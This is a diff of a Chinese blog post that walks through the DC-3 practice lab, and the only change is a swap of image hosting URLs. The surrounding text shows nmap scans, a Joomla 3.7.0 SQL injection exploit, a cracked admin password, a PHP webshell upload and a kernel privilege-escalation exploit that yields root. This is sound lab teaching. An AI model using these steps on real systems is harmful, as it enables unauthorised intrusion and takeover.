@@ -31,7 +31,7 @@ date: 2026-03-12 12:00:00
 
 查看本机网段，确认目标网段：
 
-![](https://cdn.statically.io/gh/wr0ld/BlogImage/main/img/DC-3_image1.png)
+![](https://cdn.jsdelivr.net/gh/wr0ld/BlogImage@main/img/DC-3_image1.png)
 
 使用 nmap 扫描存活主机：
 
@@ -39,7 +39,7 @@ date: 2026-03-12 12:00:00
 nmap -sn 192.168.168.0/24
 ```
 
-![](https://cdn.statically.io/gh/wr0ld/BlogImage/main/img/DC-3_image2.png)
+![](https://cdn.jsdelivr.net/gh/wr0ld/BlogImage@main/img/DC-3_image2.png)
 
 扫描结果：
 - `192.168.168.1` → VM8 网卡
@@ -56,7 +56,7 @@ nmap -sn 192.168.168.0/24
 nmap -A -p- 192.168.168.129
 ```
 
-![](https://cdn.statically.io/gh/wr0ld/BlogImage/main/img/DC-3_image3.png)
+![](https://cdn.jsdelivr.net/gh/wr0ld/BlogImage@main/img/DC-3_image3.png)
 
 > DC-3 只开放了 80 端口，攻击面集中在 Web 应用。
 
@@ -68,11 +68,11 @@ nmap -A -p- 192.168.168.129
 http://192.168.168.129/
 ```
 
-![](https://cdn.statically.io/gh/wr0ld/BlogImage/main/img/DC-3_image4.png)
+![](https://cdn.jsdelivr.net/gh/wr0ld/BlogImage@main/img/DC-3_image4.png)
 
 使用 Wappalyzer 识别 CMS 类型：
 
-![](https://cdn.statically.io/gh/wr0ld/BlogImage/main/img/DC-3_image5.png)
+![](https://cdn.jsdelivr.net/gh/wr0ld/BlogImage@main/img/DC-3_image5.png)
 
 确认为 **Joomla CMS**，接下来针对 Joomla 进行专项扫描。
 
@@ -84,7 +84,7 @@ http://192.168.168.129/
 dirsearch -u http://192.168.168.129/
 ```
 
-![](https://cdn.statically.io/gh/wr0ld/BlogImage/main/img/DC-3_image6.png)
+![](https://cdn.jsdelivr.net/gh/wr0ld/BlogImage@main/img/DC-3_image6.png)
 
 发现后台登录页面：
 
@@ -92,7 +92,7 @@ dirsearch -u http://192.168.168.129/
 http://192.168.168.129/administrator/
 ```
 
-![](https://cdn.statically.io/gh/wr0ld/BlogImage/main/img/DC-3_image7.png)
+![](https://cdn.jsdelivr.net/gh/wr0ld/BlogImage@main/img/DC-3_image7.png)
 
 ---
 
@@ -102,7 +102,7 @@ http://192.168.168.129/administrator/
 
 搜索 Joomla 专用漏洞扫描工具 JoomScan：
 
-![](https://cdn.statically.io/gh/wr0ld/BlogImage/main/img/DC-3_image8.png)
+![](https://cdn.jsdelivr.net/gh/wr0ld/BlogImage@main/img/DC-3_image8.png)
 
 安装并使用：
 
@@ -111,21 +111,21 @@ sudo apt install joomscan
 joomscan -u 192.168.168.129
 ```
 
-![](https://cdn.statically.io/gh/wr0ld/BlogImage/main/img/DC-3_image9.png)
+![](https://cdn.jsdelivr.net/gh/wr0ld/BlogImage@main/img/DC-3_image9.png)
 
-![](https://cdn.statically.io/gh/wr0ld/BlogImage/main/img/DC-3_image10.png)
+![](https://cdn.jsdelivr.net/gh/wr0ld/BlogImage@main/img/DC-3_image10.png)
 
 确认 Joomla 版本为 **3.7.0**：
 
-![](https://cdn.statically.io/gh/wr0ld/BlogImage/main/img/DC-3_image11.png)
+![](https://cdn.jsdelivr.net/gh/wr0ld/BlogImage@main/img/DC-3_image11.png)
 
 ### 2.2 搜索 Joomla 3.7.0 漏洞
 
 搜索该版本已知漏洞：
 
-![](https://cdn.statically.io/gh/wr0ld/BlogImage/main/img/DC-3_image12.png)
+![](https://cdn.jsdelivr.net/gh/wr0ld/BlogImage@main/img/DC-3_image12.png)
 
-![](https://cdn.statically.io/gh/wr0ld/BlogImage/main/img/20260306135733891.png)
+![](https://cdn.jsdelivr.net/gh/wr0ld/BlogImage@main/img/20260306135733891.png)
 
 确认存在漏洞，在 MSF 中搜索：
 
@@ -133,7 +133,7 @@ joomscan -u 192.168.168.129
 search joomla 3.7
 ```
 
-![](https://cdn.statically.io/gh/wr0ld/BlogImage/main/img/DC-3_image14.png)
+![](https://cdn.jsdelivr.net/gh/wr0ld/BlogImage@main/img/DC-3_image14.png)
 
 ---
 
@@ -150,7 +150,7 @@ set RHOSTS 192.168.168.129
 run
 ```
 
-![](https://cdn.statically.io/gh/wr0ld/BlogImage/main/img/DC-3_image15.png)
+![](https://cdn.jsdelivr.net/gh/wr0ld/BlogImage@main/img/DC-3_image15.png)
 
 报错：
 
@@ -169,7 +169,7 @@ Exploit completed, but no session was created.
 searchsploit joomla 3.7
 ```
 
-![](https://cdn.statically.io/gh/wr0ld/BlogImage/main/img/DC-3_image16.png)
+![](https://cdn.jsdelivr.net/gh/wr0ld/BlogImage@main/img/DC-3_image16.png)
 
 找到并查看利用脚本：
 
@@ -178,7 +178,7 @@ find / -name 44227.php
 cat /usr/share/exploitdb/exploits/php/remote/44227.php
 ```
 
-![](https://cdn.statically.io/gh/wr0ld/BlogImage/main/img/DC-3_image17.png)
+![](https://cdn.jsdelivr.net/gh/wr0ld/BlogImage@main/img/DC-3_image17.png)
 
 启动 PHP 内置服务器运行该脚本：
 
@@ -190,7 +190,7 @@ apt install php-curl -y
 
 （通过网站访问）
 
-![](https://cdn.statically.io/gh/wr0ld/BlogImage/main/img/DC-3_image18.png)
+![](https://cdn.jsdelivr.net/gh/wr0ld/BlogImage@main/img/DC-3_image18.png)
 
 输入目标 IP 执行攻击，获取到数据库信息：
 
@@ -209,7 +209,7 @@ apt install php-curl -y
 snoopy
 ```
 
-![](https://cdn.statically.io/gh/wr0ld/BlogImage/main/img/DC-3_image19.png)
+![](https://cdn.jsdelivr.net/gh/wr0ld/BlogImage@main/img/DC-3_image19.png)
 
 > 如在线工具解不出，也可以用 john 或 hashcat 配合字典爆破。
 
@@ -223,7 +223,7 @@ http://192.168.168.129/administrator/
 密码：snoopy
 ```
 
-![](https://cdn.statically.io/gh/wr0ld/BlogImage/main/img/DC-3_image20.png)
+![](https://cdn.jsdelivr.net/gh/wr0ld/BlogImage@main/img/DC-3_image20.png)
 
 登录成功后，回到 MSF 重新执行攻击，这次成功获取 shell：
 
@@ -233,7 +233,7 @@ set RHOSTS 192.168.168.129
 run
 ```
 
-![](https://cdn.statically.io/gh/wr0ld/BlogImage/main/img/DC-3_image21.png)
+![](https://cdn.jsdelivr.net/gh/wr0ld/BlogImage@main/img/DC-3_image21.png)
 
 > **漏洞原理说明：**
 > - SQL 注入脚本利用 Joomla 3.7.0 的 `com_fields` 组件存在注入点，直接拖库
@@ -247,7 +247,7 @@ run
 
 获取 shell 后确认当前用户权限：
 
-![](https://cdn.statically.io/gh/wr0ld/BlogImage/main/img/DC-3_image22.png)
+![](https://cdn.jsdelivr.net/gh/wr0ld/BlogImage@main/img/DC-3_image22.png)
 
 当前为 **www-data** 权限，需要提权。
 
@@ -255,7 +255,7 @@ run
 
 （为了用哥斯拉，也可以不用）
 
-![](https://cdn.statically.io/gh/wr0ld/BlogImage/main/img/DC-3_image23.png)
+![](https://cdn.jsdelivr.net/gh/wr0ld/BlogImage@main/img/DC-3_image23.png)
 
 通过 MSF 上传 PHP Webshell 到 Web 目录：
 
@@ -263,7 +263,7 @@ run
 upload '/home/kali/桌面/shell.php' /var/www/html/templates/beez3
 ```
 
-![](https://cdn.statically.io/gh/wr0ld/BlogImage/main/img/DC-3_image24.png)
+![](https://cdn.jsdelivr.net/gh/wr0ld/BlogImage@main/img/DC-3_image24.png)
 
 浏览器访问确认 Webshell 正常运行：
 
@@ -271,7 +271,7 @@ upload '/home/kali/桌面/shell.php' /var/www/html/templates/beez3
 http://192.168.168.129/templates/beez3/shell.php
 ```
 
-![](https://cdn.statically.io/gh/wr0ld/BlogImage/main/img/DC-3_image25.png)
+![](https://cdn.jsdelivr.net/gh/wr0ld/BlogImage@main/img/DC-3_image25.png)
 
 ### 4.3 使用 Linux Exploit Suggester 枚举提权方向
 
@@ -283,7 +283,7 @@ http://192.168.168.129/templates/beez3/shell.php
 wget https://raw.githubusercontent.com/mzet-/linux-exploit-suggester/master/linux-exploit-suggester.sh -O les.sh
 ```
 
-![](https://cdn.statically.io/gh/wr0ld/BlogImage/main/img/DC-3_image26.png)
+![](https://cdn.jsdelivr.net/gh/wr0ld/BlogImage@main/img/DC-3_image26.png)
 
 升级为交互式终端并执行：
 
@@ -293,13 +293,13 @@ chmod 777 les.sh
 ./les.sh
 ```
 
-![](https://cdn.statically.io/gh/wr0ld/BlogImage/main/img/DC-3_image27.png)
+![](https://cdn.jsdelivr.net/gh/wr0ld/BlogImage@main/img/DC-3_image27.png)
 
 工具推荐了多个可用的内核提权漏洞，选择使用 **CVE-2016-4557（eBPF 双重释放漏洞）**，（比脏牛更稳定。因为脏牛的一个exp失败了，就中间这个，靶机崩了，下面的就是脏牛的，先编译，后续不写了，靶机崩了3次）
 
-![](https://cdn.statically.io/gh/wr0ld/BlogImage/main/img/DC-3_image29.png)
+![](https://cdn.jsdelivr.net/gh/wr0ld/BlogImage@main/img/DC-3_image29.png)
 
-![](https://cdn.statically.io/gh/wr0ld/BlogImage/main/img/DC-3_image30.png)
+![](https://cdn.jsdelivr.net/gh/wr0ld/BlogImage@main/img/DC-3_image30.png)
 
 注：直接用脏牛（40611.c）时靶机容易崩溃，因此换用了更稳定的 eBPF 利用方式。
 
@@ -307,7 +307,7 @@ chmod 777 les.sh
 
 kali搜索漏洞
 
-![](https://cdn.statically.io/gh/wr0ld/BlogImage/main/img/DC-3_image31.png)
+![](https://cdn.jsdelivr.net/gh/wr0ld/BlogImage@main/img/DC-3_image31.png)
 
 txt里面提供了exp的下载链接
 
@@ -315,7 +315,7 @@ txt里面提供了exp的下载链接
 
 图片给错了，上传的是exploit.tar这个exp
 
-![](https://cdn.statically.io/gh/wr0ld/BlogImage/main/img/DC-3_image28.png)
+![](https://cdn.jsdelivr.net/gh/wr0ld/BlogImage@main/img/DC-3_image28.png)
 
 解压并编译执行：
 
@@ -325,7 +325,7 @@ cd ebpf_mapfd_doubleput_exploit
 ./doubleput
 ```
 
-![](https://cdn.statically.io/gh/wr0ld/BlogImage/main/img/DC-3_image34.png)
+![](https://cdn.jsdelivr.net/gh/wr0ld/BlogImage@main/img/DC-3_image34.png)
 
 ### 4.5 获取 root 权限
 
@@ -340,7 +340,7 @@ cat the-flag.txt
 
 
 
-![](https://cdn.statically.io/gh/wr0ld/BlogImage/main/img/DC-3_image35.png)
+![](https://cdn.jsdelivr.net/gh/wr0ld/BlogImage@main/img/DC-3_image35.png)
 
 ---
 
